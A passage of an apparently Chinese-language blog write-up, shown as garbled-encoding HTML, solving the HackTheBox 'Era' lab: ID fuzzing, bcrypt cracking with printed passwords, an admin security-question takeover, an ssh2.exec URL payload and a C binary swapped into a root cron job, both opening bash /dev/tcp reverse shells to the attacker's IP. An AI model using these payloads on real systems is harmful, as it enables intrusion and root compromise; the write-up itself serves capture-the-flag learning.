\____<span class="hljs-symbol">/</span>  \ \_\       <br>          \<span class="hljs-operator">/</span>_<span class="hljs-symbol">/</span>    \<span class="hljs-operator">/</span>_<span class="hljs-symbol">/</span>   \<span class="hljs-operator">/</span>___<span class="hljs-symbol">/</span>    \<span class="hljs-operator">/</span>_<span class="hljs-symbol">/</span>       <br><br>       v2.<span class="hljs-number">1</span>.<span class="hljs-number">0</span><span class="hljs-operator">-</span>dev<br>________________________________________________<br><br> :: <span class="hljs-params">Method           :</span> GET<br> :: <span class="hljs-params">URL              :</span> http:<span class="hljs-operator">//</span>file.era.htb<span class="hljs-operator">/</span>download.php<span class="hljs-operator">?</span>id<span class="hljs-operator">=</span>FUZZ<br> :: <span class="hljs-params">Wordlist         :</span> <span class="hljs-params">FUZZ:</span> <span class="hljs-symbol">/home/kali/Desktop/id.txt</span><br> :: <span class="hljs-params">Header           :</span> <span class="hljs-params">Cookie:</span> PHPSESSID<span class="hljs-operator">=</span>jufdhn16ovg3aop3qtp2jevmgg<br> :: Follow <span class="hljs-params">redirects :</span> <span class="hljs-literal">false</span><br> :: <span class="hljs-params">Calibration      :</span> <span class="hljs-literal">false</span><br> :: <span class="hljs-params">Timeout          :</span> <span class="hljs-number">10</span><br> :: <span class="hljs-params">Threads          :</span> <span class="hljs-number">40</span><br> :: <span class="hljs-params">Matcher          :</span> Response <span class="hljs-params">status:</span> <span class="hljs-number">20</span>0-<span class="hljs-number">299</span>,<span class="hljs-number">301</span>,<span class="hljs-number">302</span>,<span class="hljs-number">307</span>,<span class="hljs-number">401</span>,<span class="hljs-number">403</span>,<span class="hljs-number">405</span>,<span class="hljs-number">500</span><br> :: <span class="hljs-params">Filter           :</span> Response <span class="hljs-params">words:</span> <span class="hljs-number">3161</span><br>________________________________________________<br><br><span class="hljs-number">54</span>                      [<span class="hljs-params">Status:</span> <span class="hljs-number">200</span>, <span class="hljs-params">Size:</span> <span class="hljs-number">6378</span>, <span class="hljs-params">Words:</span> <span class="hljs-number">2552</span>, <span class="hljs-params">Lines:</span> <span class="hljs-number">222</span>, <span class="hljs-params">Duration:</span> <span class="hljs-number">141</span>ms]<br><span class="hljs-number">150</span>                     [<span class="hljs-params">Status:</span> <span class="hljs-number">200</span>, <span class="hljs-params">Size:</span> <span class="hljs-number">6366</span>, <span class="hljs-params">Words:</span> <span class="hljs-number">2552</span>, <span class="hljs-params">Lines:</span> <span class="hljs-number">222</span>, <span class="hljs-params">Duration:</span> <span class="hljs-number">93</span>ms]<br>:: <span class="hljs-params">Progress:</span> [<span class="hljs-number">1000</span><span class="hljs-operator">/</span><span class="hljs-number">1000</span>] :: Job [<span class="hljs-number">1</span><span class="hljs-operator">/</span><span class="hljs-number">1</span>] :: <span class="hljs-number">441</span> req<span class="hljs-symbol">/sec</span> :: <span class="hljs-params">Duration:</span> [<span class="hljs-number">0</span>:<span class="hljs-number">00</span>:<span class="hljs-number">03</span>] :: <span class="hljs-params">Errors:</span> <span class="hljs-number">0</span> ::<br><br></code></pre></td></tr></table></figure><p>è®¿é—®ç¬¬54ä¸ªï¼Œå‘ç°äº†å¯èƒ½æ˜¯ç½‘ç«™æºç ã€‚</p><p><img src="/2025/11/17/HackTheBox-Era/0r9ViDFID9.png"></p><p>ä¸‹è½½ä¸‹æ¥å‘ç°é‡Œé¢æœ‰æ•°æ®åº“æ–‡ä»¶ï¼Œé‡Œé¢æœ‰å¯†ç ã€‚</p><p><img src="/2025/11/17/HackTheBox-Era/navicat_hNePiOtVRi.png"></p><p>æˆåŠŸç ´è§£å‡ºä¸¤ä¸ªç”¨æˆ·çš„å¯†ç ã€‚</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">john hash.txt <span class="hljs-comment">--wordlist=rockyou.txt    </span><br><span class="hljs-keyword">Using</span> <span class="hljs-keyword">default</span> <span class="hljs-keyword">input</span> <span class="hljs-keyword">encoding</span>: UTF<span class="hljs-number">-8</span><br>Loaded <span class="hljs-number">6</span> <span class="hljs-keyword">password</span> hashes <span class="hljs-keyword">with</span> <span class="hljs-number">6</span> different salts (bcrypt [Blowfish <span class="hljs-number">32</span>/<span class="hljs-number">64</span> X3])<br>Loaded hashes <span class="hljs-keyword">with</span> <span class="hljs-keyword">cost</span> <span class="hljs-number">1</span> (iteration count) <span class="hljs-type">varying</span> <span class="hljs-keyword">from</span> <span class="hljs-number">1024</span> <span class="hljs-keyword">to</span> <span class="hljs-number">4096</span><br>Will run <span class="hljs-number">4</span> OpenMP threads<br>Press <span class="hljs-string">&#x27;q&#x27;</span> <span class="hljs-keyword">or</span> Ctrl-C <span class="hljs-keyword">to</span> <span class="hljs-keyword">abort</span>, almost <span class="hljs-keyword">any</span> other key <span class="hljs-keyword">for</span> status<br>america          (eric)     <br>mustang          (yuri)     <br><span class="hljs-number">2</span>g <span class="hljs-number">0</span>:<span class="hljs-number">00</span>:<span class="hljs-number">01</span>:<span class="hljs-number">55</span> <span class="hljs-number">0.03</span>% (ETA: <span class="hljs-number">2025</span><span class="hljs-number">-11</span><span class="hljs-number">-21</span> <span class="hljs-number">08</span>:<span class="hljs-number">41</span>) <span class="hljs-number">0.01735</span>g/s <span class="hljs-number">47.17</span>p/s <span class="hljs-number">193.6</span>c/s <span class="hljs-number">193.6</span>C/s marias..ilovejack<br>Use the &quot;--show&quot; <span class="hljs-keyword">option</span> <span class="hljs-keyword">to</span> display <span class="hljs-keyword">all</span> <span class="hljs-keyword">of</span> the cracked passwords reliably<br><span class="hljs-keyword">Session</span> aborted<br><br></code></pre></td></tr></table></figure><p>ä½†æ˜¯ç™»å½•ä¸Šå»æ²¡æœ‰æ–‡ä»¶å¯ä»¥ä¿®æ”¹ï¼Œå°è¯•ä»¥ç®¡ç†å‘˜çš„èº«ä»½ç™»å½•ã€‚</p><p><img src="/2025/11/17/HackTheBox-Era/vmware_WKVWGwqCud.png"></p><p>è¿™é‡Œéå¸¸å¥‡æ€ªçš„æ˜¯ï¼Œä»¥Aç”¨æˆ·çš„èº«ä»½ç™»å½•å¯ä»¥ä¿®æ”¹Bç”¨æˆ·çš„å¯†ä¿é—®é¢˜ï¼Œåˆ©ç”¨è¿™ä¸€ç‚¹ä¿®æ”¹ç®¡ç†å‘˜çš„å¯†ä¿é—®é¢˜ã€‚</p><p>æˆåŠŸä»¥ç®¡ç†å‘˜çš„èº«ä»½ç™»å½•ã€‚</p><p><img src="/2025/11/17/HackTheBox-Era/vmware_vk7ktaRSt8.png"></p><p>ä¸‹è½½åº•ä¸‹çš„signæ–‡ä»¶ï¼Œå‘ç°æœ‰ä¸ªé‚®ç®±ï¼Œä¸çŸ¥é“æœ‰ä»€ä¹ˆç”¨ã€‚</p><p><img src="/2025/11/17/HackTheBox-Era/vmware_4JRc6eCdGE.png"></p><h3 id="GetEric"><a href="#GetEric" class="headerlink" title="GetEric"></a>GetEric</h3><hr><p>ä¹‹åè¿™ä¸€å—æ²¡æƒ³åˆ°å¥½çš„åˆ©ç”¨ç‚¹ï¼Œå›å»çœ‹ftpæœåŠ¡ï¼Œå‘ç°yuriç”¨æ•°æ®åº“é‡Œçš„å‡­è¯å¯ä»¥ç™»å½•ä¸Šå»ã€‚</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">ftp</span> <span class="hljs-number">10.10.11.79</span> <br><span class="hljs-attribute">Connected</span> to <span class="hljs-number">10.10.11.79</span>.<br><span class="hljs-attribute">220</span> (vsFTPd <span class="hljs-number">3</span>.<span class="hljs-number">0</span>.<span class="hljs-number">5</span>)<br><span class="hljs-attribute">Name</span> (<span class="hljs-number">10.10.11.79</span>:kali): yuri<br><span class="hljs-attribute">331</span> Please specify the password.<br><span class="hljs-attribute">Password</span>: <br><span class="hljs-attribute">230</span> Login successful.<br><span class="hljs-attribute">Remote</span> system type is UNIX.<br><span class="hljs-attribute">Using</span> binary mode to transfer files.<br><span class="hljs-attribute">ftp</span>&gt; ls<br><span class="hljs-attribute">229</span> Entering Extended Passive Mode (|||<span class="hljs-number">62972</span>|)<br><span class="hljs-attribute">150</span> Here comes the directory listing.<br><span class="hljs-attribute">drwxr</span>-xr-x    <span class="hljs-number">2</span> <span class="hljs-number">0</span>        <span class="hljs-number">0</span>            <span class="hljs-number">4096</span> Jul <span class="hljs-number">22</span> <span class="hljs-number">08</span>:<span class="hljs-number">42</span> apache2_conf<br><span class="hljs-attribute">drwxr</span>-xr-x    <span class="hljs-number">3</span> <span class="hljs-number">0</span>        <span class="hljs-number">0</span>            <span class="hljs-number">4096</span> Jul <span class="hljs-number">22</span> <span class="hljs-number">08</span>:<span class="hljs-number">42</span> php8.<span class="hljs-number">1</span>_conf<br></code></pre></td></tr></table></figure><p>è¿›åˆ°php8.1ç›®å½•é‡Œï¼Œå‘ç°ssh2æœåŠ¡å¯ç”¨ã€‚</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs perl">sh2:<span class="hljs-regexp">//</span><br>ssh2:<span class="hljs-regexp">//</span> â€” å®‰å…¨å¤–å£³åè®® <span class="hljs-number">2</span><br><br>è¯´æ˜<br>ssh2.shell:<span class="hljs-regexp">//</span> ssh2.exec:<span class="hljs-regexp">//</span> ssh2.tunnel:<span class="hljs-regexp">//</span> ssh2.sftp:<span class="hljs-regexp">//</span> ssh2.scp:<span class="hljs-regexp">//</span> (PECL)<br><br>æ³¨æ„: è¯¥å°è£…å™¨é»˜è®¤æ²¡æœ‰æ¿€æ´»<br>ä¸ºäº†ä½¿ç”¨ ssh2.*:<span class="hljs-regexp">//</span> å°è£…åè®®ï¼Œå¿…é¡»ä» Â» PECL ä¸­å®‰è£…æœ‰æ•ˆçš„ Â» SSH2 æ‰©å±•ã€‚<br><br>é™¤äº†æ”¯æŒä¼ ç»Ÿçš„ URI ç™»å½•ä¿¡æ¯ï¼Œssh2 å°è£…åè®®ä¹Ÿæ”¯æŒé€šè¿‡ URL çš„ä¸»æœºï¼ˆhostï¼‰éƒ¨åˆ†æ¥å¤ç”¨æ‰“å¼€è¿æ¥ã€‚<br><br>ç”¨æ³•<br>ssh2.shell:<span class="hljs-regexp">//us</span>er:pass<span class="hljs-variable">@example</span>.com:<span class="hljs-number">22</span>/xterm<br>ssh2.exec:<span class="hljs-regexp">//us</span>er:pass<span class="hljs-variable">@example</span>.com:<span class="hljs-number">22</span>/usr/<span class="hljs-keyword">local</span>/bin/somecmd<br>ssh2.tunnel:<span class="hljs-regexp">//us</span>er:pass<span class="hljs-variable">@example</span>.com:<span class="hljs-number">22</span>/<span class="hljs-number">192.168</span>.<span class="hljs-number">0</span>.<span class="hljs-number">1</span>:<span class="hljs-number">14</span><br>ssh2.sftp:<span class="hljs-regexp">//us</span>er:pass<span class="hljs-variable">@example</span>.com:<span class="hljs-number">22</span>/path/to/filename<br></code></pre></td></tr></table></figure><p>åŒæ—¶å®¡è®¡ä¹‹å‰çš„download.php,å‘ç°å½“ç”¨æˆ·ä¸ºç®¡ç†å‘˜æ—¶ï¼Œå¯ä»¥æ§åˆ¶fopenå‡½æ•°ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">// BETA (Currently only available to the admin) - Showcase file instead of downloading it</span><br>&#125; <span class="hljs-keyword">elseif</span> (<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;show&#x27;</span>] === <span class="hljs-string">&quot;true&quot;</span> &amp;&amp; <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;erauser&#x27;</span>] === <span class="hljs-number">1</span>) &#123;<br>    <span class="hljs-variable">$format</span> = <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;format&#x27;</span>]) ? <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;format&#x27;</span>] : <span class="hljs-string">&#x27;&#x27;</span>;<br>    <span class="hljs-variable">$file</span> = <span class="hljs-variable">$fetched</span>[<span class="hljs-number">0</span>];<br><br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$format</span>, <span class="hljs-string">&#x27;://&#x27;</span>) !== <span class="hljs-literal">false</span>) &#123;<br>        <span class="hljs-variable">$wrapper</span> = <span class="hljs-variable">$format</span>;<br>        <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Content-Type: application/octet-stream&#x27;</span>);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-variable">$wrapper</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br>        <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Content-Type: text/html&#x27;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-variable">$file_content</span> = <span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-variable">$wrapper</span> ? <span class="hljs-variable">$wrapper</span> . <span class="hljs-variable">$file</span> : <span class="hljs-variable">$file</span>, <span class="hljs-string">&#x27;r&#x27;</span>);<br><span class="hljs-variable">$full_path</span> = <span class="hljs-variable">$wrapper</span> ? <span class="hljs-variable">$wrapper</span> . <span class="hljs-variable">$file</span> : <span class="hljs-variable">$file</span>;<br><span class="hljs-comment">// Debug Output</span><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Opening: &quot;</span> . <span class="hljs-variable">$full_path</span> . <span class="hljs-string">&quot;\n&quot;</span>;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$file_content</span>;<br>    &#125; <span class="hljs-keyword">catch</span> (<span class="hljs-built_in">Exception</span> <span class="hljs-variable">$e</span>) &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Error reading file: &quot;</span> . <span class="hljs-variable">$e</span>-&gt;<span class="hljs-title function_ invoke__">getMessage</span>();<br>    &#125;<br></code></pre></td></tr></table></figure><p>æ„é€ payloadã€‚</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://file.era.htb/download.php?id=<span class="hljs-number">150</span>&amp;show=true&amp;format=ssh2.exec://eric:america@<span class="hljs-number">127.0.0.1:22</span>/bash+-i+%<span class="hljs-number">3</span>E%<span class="hljs-number">26</span>+/dev/tcp/<span class="hljs-number">10.10.16.20</span>/<span class="hljs-number">4444</span>+<span class="hljs-number">0</span>%<span class="hljs-number">3</span>E%<span class="hljs-number">261</span>;<br></code></pre></td></tr></table></figure><p><img src="/2025/11/17/HackTheBox-Era/vmware_MPpau0AeHK.png"></p><h3 id="Root"><a href="#Root" class="headerlink" title="Root"></a>Root</h3><hr><p>ä¸Šä¼ pspy64æŸ¥çœ‹è¿›ç¨‹ã€‚</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">2025</span>/<span class="hljs-number">11</span>/<span class="hljs-number">17</span> <span class="hljs-number">06</span>:<span class="hljs-number">51</span>:<span class="hljs-number">44</span> CMD: UID=<span class="hljs-number">1000</span>  PID=<span class="hljs-number">12568</span>  | /bin/bash -i <br><span class="hljs-attribute">2025</span>/<span class="hljs-number">11</span>/<span class="hljs-number">17</span> <span class="hljs-number">06</span>:<span class="hljs-number">52</span>:<span class="hljs-number">01</span> CMD: UID=<span class="hljs-number">0</span>     PID=<span class="hljs-number">12572</span>  | /usr/sbin/CRON -f -P <br><span class="hljs-attribute">2025</span>/<span class="hljs-number">11</span>/<span class="hljs-number">17</span> <span class="hljs-number">06</span>:<span class="hljs-number">52</span>:<span class="hljs-number">01</span> CMD: UID=<span class="hljs-number">0</span>     PID=<span class="hljs-number">12573</span>  | /usr/sbin/CRON -f -P <br><span class="hljs-attribute">2025</span>/<span class="hljs-number">11</span>/<span class="hljs-number">17</span> <span class="hljs-number">06</span>:<span class="hljs-number">52</span>:<span class="hljs-number">01</span> CMD: UID=<span class="hljs-number">0</span>     PID=<span class="hljs-number">12574</span>  | bash -c /root/initiate_monitoring.sh <br><span class="hljs-attribute">2025</span>/<span class="hljs-number">11</span>/<span class="hljs-number">17</span> <span class="hljs-number">06</span>:<span class="hljs-number">52</span>:<span class="hljs-number">01</span> CMD: UID=???   PID=<span class="hljs-number">12575</span>  | ???<br><span class="hljs-attribute">2025</span>/<span class="hljs-number">11</span>/<span class="hljs-number">17</span> <span class="hljs-number">06</span>:<span class="hljs-number">52</span>:<span class="hljs-number">01</span> CMD: UID=<span class="hljs-number">0</span>     PID=<span class="hljs-number">12576</span>  | /bin/bash /root/initiate_monitoring.sh <br><span class="hljs-attribute">2025</span>/<span class="hljs-number">11</span>/<span class="hljs-number">17</span> <span class="hljs-number">06</span>:<span class="hljs-number">52</span>:<span class="hljs-number">01</span> CMD: UID=<span class="hljs-number">0</span>     PID=<span class="hljs-number">12577</span>  | openssl asn1parse -inform DER -in text_sig_section.bin <br><span class="hljs-attribute">2025</span>/<span class="hljs-number">11</span>/<span class="hljs-number">17</span> <span class="hljs-number">06</span>:<span class="hljs-number">52</span>:<span class="hljs-number">01</span> CMD: UID=<span class="hljs-number">0</span>     PID=<span class="hljs-number">12580</span>  | /bin/bash /root/initiate_monitoring.sh <br><span class="hljs-attribute">2025</span>/<span class="hljs-number">11</span>/<span class="hljs-number">17</span> <span class="hljs-number">06</span>:<span class="hljs-number">52</span>:<span class="hljs-number">01</span> CMD: UID=<span class="hljs-number">0</span>     PID=<span class="hljs-number">12578</span>  | /bin/bash /root/initiate_monitoring.sh <br><span class="hljs-attribute">2025</span>/<span class="hljs-number">11</span>/<span class="hljs-number">17</span> <span class="hljs-number">06</span>:<span class="hljs-number">52</span>:<span class="hljs-number">01</span> CMD: UID=<span class="hljs-number">0</span>     PID=<span class="hljs-number">12583</span>  | <br><span class="hljs-attribute">2025</span>/<span class="hljs-number">11</span>/<span class="hljs-number">17</span> <span class="hljs-number">06</span>:<span class="hljs-number">52</span>:<span class="hljs-number">01</span> CMD: UID=<span class="hljs-number">0</span>     PID=<span class="hljs-number">12581</span>  | /bin/bash /root/initiate_monitoring.sh <br><span class="hljs-attribute">2025</span>/<span class="hljs-number">11</span>/<span class="hljs-number">17</span> <span class="hljs-number">06</span>:<span class="hljs-number">52</span>:<span class="hljs-number">01</span> CMD: UID=<span class="hljs-number">0</span>     PID=<span class="hljs-number">12584</span>  | /bin/bash /root/initiate_monitoring.sh <br><span class="hljs-attribute">2025</span>/<span class="hljs-number">11</span>/<span class="hljs-number">17</span> <span class="hljs-number">06</span>:<span class="hljs-number">52</span>:<span class="hljs-number">04</span> CMD: UID=<span class="hljs-number">0</span>     PID=<span class="hljs-number">12585</span>  | <br><span class="hljs-attribute">2025</span>/<span class="hljs-number">11</span>/<span class="hljs-number">17</span> <span class="hljs-number">06</span>:<span class="hljs-number">52</span>:<span class="hljs-number">16</span> CMD: UID=<span class="hljs-number">1000</span>  PID=<span class="hljs-number">12586</span>  | cat user.txt <br><span class="hljs-attribute">2025</span>/<span class="hljs-number">11</span>/<span class="hljs-number">17</span> <span class="hljs-number">06</span>:<span class="hljs-number">52</span>:<span class="hljs-number">38</span> CMD: UID=<span class="hljs-number">1000</span>  PID=<span class="hljs-number">12589</span>  | /bin/bash -i <br><span class="hljs-attribute">2025</span>/<span class="hljs-number">11</span>/<span class="hljs-number">17</span> <span class="hljs-number">06</span>:<span class="hljs-number">52</span>:<span class="hljs-number">47</span> CMD: UID=<span class="hljs-number">1000</span>  PID=<span class="hljs-number">12591</span>  | ls --color=auto -la <br><span class="hljs-attribute">2025</span>/<span class="hljs-number">11</span>/<span class="hljs-number">17</span> <span class="hljs-number">06</span>:<span class="hljs-number">52</span>:<span class="hljs-number">57</span> CMD: UID=<span class="hljs-number">1000</span>  PID=<span class="hljs-number">12594</span>  | /bin/bash -i <br><span class="hljs-attribute">2025</span>/<span class="hljs-number">11</span>/<span class="hljs-number">17</span> <span class="hljs-number">06</span>:<span class="hljs-number">53</span>:<span class="hljs-number">01</span> CMD: UID=<span class="hljs-number">0</span>     PID=<span class="hljs-number">12603</span>  | /usr/sbin/CRON -f -P <br><span class="hljs-attribute">2025</span>/<span class="hljs-number">11</span>/<span class="hljs-number">17</span> <span class="hljs-number">06</span>:<span class="hljs-number">53</span>:<span class="hljs-number">01</span> CMD: UID=<span class="hljs-number">0</span>     PID=<span class="hljs-number">12604</span>  | /bin/sh -c bash -c &#x27;/root/initiate_monitoring.sh&#x27; &gt;&gt; /opt/AV/periodic-checks/status.log <span class="hljs-number">2</span>&gt;&amp;<span class="hljs-number">1</span> <br><span class="hljs-attribute">2025</span>/<span class="hljs-number">11</span>/<span class="hljs-number">17</span> <span class="hljs-number">06</span>:<span class="hljs-number">53</span>:<span class="hljs-number">01</span> CMD: UID=<span class="hljs-number">0</span>     PID=<span class="hljs-number">12605</span>  | <br><span class="hljs-attribute">2025</span>/<span class="hljs-number">11</span>/<span class="hljs-number">17</span> <span class="hljs-number">06</span>:<span class="hljs-number">53</span>:<span class="hljs-number">01</span> CMD: UID=<span class="hljs-number">0</span>     PID=<span class="hljs-number">12606</span>  | /bin/bash /root/initiate_monitoring.sh <br><span class="hljs-attribute">2025</span>/<span class="hljs-number">11</span>/<span class="hljs-number">17</span> <span class="hljs-number">06</span>:<span class="hljs-number">53</span>:<span class="hljs-number">01</span> CMD: UID=<span class="hljs-number">0</span>     PID=<span class="hljs-number">12608</span>  | /bin/bash /root/initiate_monitoring.sh <br><span class="hljs-attribute">2025</span>/<span class="hljs-number">11</span>/<span class="hljs-number">17</span> <span class="hljs-number">06</span>:<span class="hljs-number">53</span>:<span class="hljs-number">01</span> CMD: UID=<span class="hljs-number">0</span>     PID=<span class="hljs-number">12607</span>  | /bin/bash /root/initiate_monitoring.sh <br><span class="hljs-attribute">2025</span>/<span class="hljs-number">11</span>/<span class="hljs-number">17</span> <span class="hljs-number">06</span>:<span class="hljs-number">53</span>:<span class="hljs-number">01</span> CMD: UID=<span class="hljs-number">0</span>     PID=<span class="hljs-number">12610</span>  | /bin/bash /root/initiate_monitoring.sh <br><span class="hljs-attribute">2025</span>/<span class="hljs-number">11</span>/<span class="hljs-number">17</span> <span class="hljs-number">06</span>:<span class="hljs-number">53</span>:<span class="hljs-number">01</span> CMD: UID=<span class="hljs-number">0</span>     PID=<span class="hljs-number">12609</span>  | /bin/bash /root/initiate_monitoring.sh <br><span class="hljs-attribute">2025</span>/<span class="hljs-number">11</span>/<span class="hljs-number">17</span> <span class="hljs-number">06</span>:<span class="hljs-number">53</span>:<span class="hljs-number">01</span> CMD: UID=<span class="hljs-number">0</span>     PID=<span class="hljs-number">12611</span>  | grep -oP (?&lt;=UTF8STRING        :)Era Inc. <br><span class="hljs-attribute">2025</span>/<span class="hljs-number">11</span>/<span class="hljs-number">17</span> <span class="hljs-number">06</span>:<span class="hljs-number">53</span>:<span class="hljs-number">01</span> CMD: UID=<span class="hljs-number">0</span>     PID=<span class="hljs-number">12614</span>  | /bin/bash /root/initiate_monitoring.sh <br><span class="hljs-attribute">2025</span>/<span class="hljs-number">11</span>/<span class="hljs-number">17</span> <span class="hljs-number">06</span>:<span class="hljs-number">53</span>:<span class="hljs-number">01</span> CMD: UID=<span class="hljs-number">0</span>     PID=<span class="hljs-number">12612</span>  | /bin/bash /root/initiate_monitoring.sh <br><span class="hljs-attribute">2025</span>/<span class="hljs-number">11</span>/<span class="hljs-number">17</span> <span class="hljs-number">06</span>:<span class="hljs-number">53</span>:<span class="hljs-number">01</span> CMD: UID=<span class="hljs-number">0</span>     PID=<span class="hljs-number">12615</span>  | /bin/bash /root/initiate_monitoring.sh <br><br></code></pre></td></tr></table></figure><p>æ³¨æ„åˆ°rootéå¸¸é¢‘ç¹çš„æ‰§è¡Œinitiate_monitoring.shè¿™ä¸ªä»»åŠ¡</p><p>ä¸Šä¼ linpeasåæ³¨æ„åˆ°æˆ‘ä»¬å¯å†™ä¸€ä¸ªæ–‡ä»¶ã€‚</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs elixir">eric<span class="hljs-variable">@era</span><span class="hljs-symbol">:/opt/AV/periodic-checks</span><span class="hljs-variable">$ </span>ls -al<br>total <span class="hljs-number">32</span><br>drwxrwxr-- <span class="hljs-number">2</span> root devs  <span class="hljs-number">4096</span> <span class="hljs-title class_">Nov</span> <span class="hljs-number">17</span> <span class="hljs-number">06</span><span class="hljs-symbol">:</span><span class="hljs-number">56</span> .<br>drwxrwxr-- <span class="hljs-number">3</span> root devs  <span class="hljs-number">4096</span> <span class="hljs-title class_">Jul</span> <span class="hljs-number">22</span> <span class="hljs-number">08</span><span class="hljs-symbol">:</span><span class="hljs-number">42</span> ..<br>-rwxrw---- <span class="hljs-number">1</span> root devs <span class="hljs-number">16544</span> <span class="hljs-title class_">Nov</span> <span class="hljs-number">17</span> <span class="hljs-number">06</span><span class="hljs-symbol">:</span><span class="hljs-number">56</span> monitor<br>-rw-rw---- <span class="hljs-number">1</span> root devs   <span class="hljs-number">307</span> <span class="hljs-title class_">Nov</span> <span class="hljs-number">17</span> <span class="hljs-number">06</span><span class="hljs-symbol">:</span><span class="hljs-number">56</span> status.log<br>eric<span class="hljs-variable">@era</span><span class="hljs-symbol">:/opt/AV/periodic-checks</span><span class="hljs-variable">$ </span>id<br>uid=<span class="hljs-number">1000</span>(eric) gid=<span class="hljs-number">1000</span>(eric) groups=<span class="hljs-number">1000</span>(eric),<span class="hljs-number">1001</span>(devs)<br>eric<span class="hljs-variable">@era</span><span class="hljs-symbol">:/opt/AV/periodic-checks</span><span class="hljs-variable">$ </span><br><br></code></pre></td></tr></table></figure><p>ç»“åˆä¹‹å‰çš„è¿›ç¨‹ï¼ŒçŸ¥é“è¿™ä¸ªä¸œè¥¿ä¼šè¢«å®šæœŸæ‰§è¡Œï¼Œå†™å¥½æ›¿æ¢å³å¯ã€‚</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs csharp"> cat pwn.<span class="hljs-function">c </span><br><span class="hljs-function"><span class="hljs-built_in">int</span> <span class="hljs-title">main</span>()</span> &#123;<br>    system(<span class="hljs-string">&quot;/bin/bash -c &#x27;bash -i &gt;&amp; /dev/tcp/10.10.16.20/9999 0&gt;&amp;1&#x27;&quot;</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>ï¼ˆè¿™é‡Œè¦è®°å¾—å¤åˆ¶monitorçš„ç‰¹å¾ç ï¼Œå› ä¸ºä»–ä¼šæ£€æµ‹ï¼Œç›´æ¥ä¸Šä¼ æ˜¯ä¸è¡Œçš„ã€‚ï¼‰</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs ruby">eric<span class="hljs-variable">@era</span><span 